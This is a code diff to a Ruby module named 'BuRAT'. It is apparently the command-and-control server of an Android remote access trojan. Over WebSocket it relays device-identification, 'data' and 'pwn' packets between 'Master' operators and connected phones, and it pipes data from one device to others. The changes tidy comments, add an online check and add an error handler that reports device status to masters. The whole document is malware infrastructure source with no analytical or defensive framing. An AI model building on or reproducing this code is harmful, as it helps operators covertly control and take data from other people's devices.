@@ -14,13 +14,11 @@ module BuRAT
       if Faye::WebSocket.websocket?(env)
         ws = Faye::WebSocket.new(env, nil, {ping: KEEPALIVE_TIME })
 
-        # OPEN
-        ws.on :open do |event|
+        ws.on :open do |event| # open
 
         end
 
-        # MESSAGE
-        ws.on :message do |event|
+        ws.on :message do |event| # message
           begin
             packet = JSON.parse(event.data) # parse packet
 
@@ -28,12 +26,12 @@ module BuRAT
             payload = packet['payload']     # payload
             trailer = packet['trailer']     # trailer
 
-            p "#{header} #{trailer}"
+            p "#{header} #{trailer}"        # debug
 
-            if header == "androids" then     # clients - list of clients
+            if header == "androids" then # clients - list of clients
               packet = packet("androids", @androids, 'deathnote')
               ws.send(packet)
-            elsif header == "android" then   # client - client identification
+            elsif header == "android" then # client - client identification
               android = @androids.find { |android| android["id"] == payload["id"] }
               payload.store("status", "Online")
               payload.store("ws", ws)
@@ -42,25 +40,24 @@ module BuRAT
               packet = packet("android", payload, "disconnected")
               masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
               masters.each { |master| master["ws"].send(packet) }
-            elsif header == "data" then     # data - send to master and pipe
+            elsif header == "data" then # data - send to master and pipe
               packet = packet("data", payload, trailer)
               masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
               masters.each { |master| master["ws"].send(packet) }
-              #pipe
               android = @androids.find { |android| android["id"] == payload["android"] }
               inator = android["inators"].find { |inator| inator["code"] == payload["inator"] }
               inator["pipes"].each do |pipe|
-                android = @androids.find { |android| android["id"] == pipe["android"] }
+                android = @androids.find { |android| android["id"] == pipe["android"] && android["status"] == "Online"}
                 payload["android"] = pipe["android"]
                 payload["inator"] = pipe["inator"]
                 packet = packet("pwn", payload, trailer)
                 android["ws"].send(packet)
               end
-            elsif header == "pwn" then      # pwn - send to other clients
+            elsif header == "pwn" then # pwn - send to other clients
               packet = packet("pwn", payload, trailer)
               android = @androids.find { |android| android["id"] == payload["android"]}
               android["ws"].send(packet)
-            elsif header == "pipe" then
+            elsif header == "pipe" then # pipe - open or close pipe
               android = @androids.find { |android| android["id"] == payload["android_in"] }
               inator = android["inators"].find { |inator| inator["code"] == payload["inator_in"] }
               case payload["switch"]
@@ -79,12 +76,20 @@ module BuRAT
           end
         end
 
-        # CLOSE
-        ws.on :close do |event|
+        ws.on :close do |event| # close
           android = @androids.find { |android| android["ws"] == ws }
           android["status"] = "Offline"
           android["ws"] = nil
           packet = packet('android', android, "disconnected")
+          masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
+          masters.each { |master| master["ws"].send(packet) }
+        end
+
+        ws.on :error do |event| # error
+          android = @androids.find { |android| android["ws"] == ws }
+          android["status"] = "Error"
+          android["ws"] = nil
+          packet = packet('android', android, "#{event.code} #{event.reason}")
           masters = @androids.select { |android| android["type"] == "Master" && android["status"] == "Online" }
           masters.each { |master| master["ws"].send(packet) }
         end
@@ -98,7 +103,7 @@ module BuRAT
     end
 
     private
-    def packet(header, payload, trailer)
+    def packet(header, payload, trailer) # packet
       {'header' => header, 'payload' => payload, 'trailer' => trailer}.to_json
     end
 
